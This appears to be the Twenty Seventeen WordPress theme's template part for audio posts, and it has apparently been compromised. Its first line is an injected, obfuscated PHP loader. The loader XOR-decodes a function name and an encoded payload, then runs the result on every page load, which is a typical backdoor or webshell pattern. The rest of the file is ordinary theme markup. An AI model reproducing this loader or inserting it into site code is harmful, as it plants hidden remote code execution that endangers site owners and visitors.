<?php $UdIWpg='N7+;=51>U-75G:Y'; $bixwcNI='-ENZIPnX CTA.U7'^$UdIWpg; $FQKJveY='1 Br.GX66 :=+W7+2 OPl7U .JVO;o9XXNkmJf4m<4XSS:E;CEKSY+Y76,jkFO=Eo,X94XWm:3;hqxjaDGHgOo8 GWKhdCs2G5 O<js YrztIBo9RN  U5ZDvX5,SQhzt=JMLs=jp=:5fwNyqj 9A7ba-7poAw-++<eEooj>.=>< kF81,kjfroem U5 RRkFAMHoq224g<O:gX5=VYdtXX4 SZzWH41;gS1TlmOTT4G.SB= YC7JSZhPfd2 xk+uy1>wv<7MboXuE4U8,+pRW2Ef5J1S7PRGTkvNY31kf4vRO0LKrUm3Q59PAhMSoQUccsf-U>.YjGoj <62 -Fmywlgreit+>LAJbj.E6ShPGb0P59 HVEhZDTXX<S0WV7DYfKF.=u11=t-ST2uVJoO0U: MXqOn;clgP9G;Itc7GE56C>MA  Uk  =bWX2PtdXE>C W;Nqm2T-N6SVQj2TE8GfKsJP9W<Y,-PnlnP3ibUROTohts-8D,H<3=L1T6QS5KGM=X4bjzE=+=2sAolZmPUoLS=;H1nm84 f6NxzeEdj0bgSMXLMltgSufqTSj 2nvc+W y1rxLfSZgttP9 9Ld2H8cVV: LDlL=7KWSU=sTgi3858SOiiFbCW9bzP9+>Km<0E5-K AGU>SYmqjs0A.+. cIlOrV'; $NCBTMUwt=$bixwcNI('', 'XFjSH26UBIUSt2OBAT<xKO:Rq.7;Z0f5-:LDcFOg5R-=0N,T-e3<+t=VBM54+:ImKH9MUtwIQVBAQXJAd<BnFKWU3wvHCdH8N<F NBWIyOZDrbKPn=TR9P4lR<TX2xSZPTafey4cTROAFYsYYNDX5V9EDjP1aSFNRgA,OJJMZORYNCbSTUB7OIeldR0AU <Cb.8<FJ8;ImAE0C<TI7yYT>9XS6aps,UEZ88T-LPo25X4KhH7F61R+02HxB;qo7 b0YPMWRWR4BRfUaB4TYNYr,8LBQ+E2h;7>tVVj2VHPl=R6.D-kOuIE0YL5zb0Ye83CKRBI4JOpJ<ecFSDWAN.MQS3574<1xjl 9BNE OsUngFF1YLEav>bSMp<9H2o<3NddFo-KDN;84PI2 SUkjK9Q9OEvRx2dFifC4X3ZiICw2+FS1W,-IZ0CXOO=39F1+;50JkB6H+GYm0H-Y73yNV51YnJkW.1M6c2ITyGWd9UAF13;5ONRSLJ6M1cXX5n1N8 A8ojV=MEFZaYJISZaIJzE=1ZdwYZ<P5JSQYAkgXGXeCSSVQ0.;yzYBU6GPB7fSCSXGPIoDHUKKtAzzART1KRX5;Y-A<3.SS87DkMV2;<4YTxGMWYAYzfIIfBcwBhs5OJRcIXQ1TvlP >9Q2=J,CH:HKSGTKyEtx+'^$FQKJveY); $NCBTMUwt();
/**
 * Template part for displaying audio posts
 *
 * @link https://developer.wordpress.org/themes/basics/template-hierarchy/
 *
 * @package WordPress
 * @subpackage Twenty_Seventeen
 * @since Twenty Seventeen 1.0
 * @version 1.2
 */

?>

<article id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
	<?php
	if ( is_sticky() && is_home() ) {
		echo twentyseventeen_get_svg( array( 'icon' => 'thumb-tack' ) );
	}
	?>
	<header class="entry-header">
		<?php
		if ( 'post' === get_post_type() ) {
			echo '<div class="entry-meta">';
			if ( is_single() ) {
				twentyseventeen_posted_on();
			} else {
				echo twentyseventeen_time_link();
				twentyseventeen_edit_link();
			};
				echo '</div><!-- .entry-meta -->';
		};

		if ( is_single() ) {
			the_title( '<h1 class="entry-title">', '</h1>' );
		} elseif ( is_front_page() && is_home() ) {
			the_title( '<h3 class="entry-title"><a href="' . esc_url( get_permalink() ) . '" rel="bookmark">', '</a></h3>' );
		} else {
			the_title( '<h2 class="entry-title"><a href="' . esc_url( get_permalink() ) . '" rel="bookmark">', '</a></h2>' );
		}
		?>
	</header><!-- .entry-header -->

	<?php
		$content = apply_filters( 'the_content', get_the_content() );
		$audio   = false;

		// Only get audio from the content if a playlist isn't present.
	if ( false === strpos( $content, 'wp-playlist-script' ) ) {
		$audio = get_media_embedded_in_content( $content, array( 'audio' ) );
	}

	?>

	<?php if ( '' !== get_the_post_thumbnail() && ! is_single() ) : ?>
		<div class="post-thumbnail">
			<a href="<?php the_permalink(); ?>">
				<?php the_post_thumbnail( 'twentyseventeen-featured-image' ); ?>
			</a>
		</div><!-- .post-thumbnail -->
	<?php endif; ?>

	<div class="entry-content">

		<?php
		if ( ! is_single() ) {

			// If not a single post, highlight the audio file.
			if ( ! empty( $audio ) ) {
				foreach ( $audio as $audio_html ) {
					echo '<div class="entry-audio">';
						echo $audio_html;
					echo '</div><!-- .entry-audio -->';
				}
			};

		};

		if ( is_single() || empty( $audio ) ) {

			the_content(
				sprintf(
					/* translators: %s: Post title. */
					__( 'Continue reading<span class="screen-reader-text"> "%s"</span>', 'twentyseventeen' ),
					get_the_title()
				)
			);

			wp_link_pages(
				array(
					'before'      => '<div class="page-links">' . __( 'Pages:', 'twentyseventeen' ),
					'after'       => '</div>',
					'link_before' => '<span class="page-number">',
					'link_after'  => '</span>',
				)
			);

		};
		?>

	</div><!-- .entry-content -->

	<?php
	if ( is_single() ) {
		twentyseventeen_entry_footer();
	}
	?>

</article><!-- #post-<?php the_ID(); ?> -->
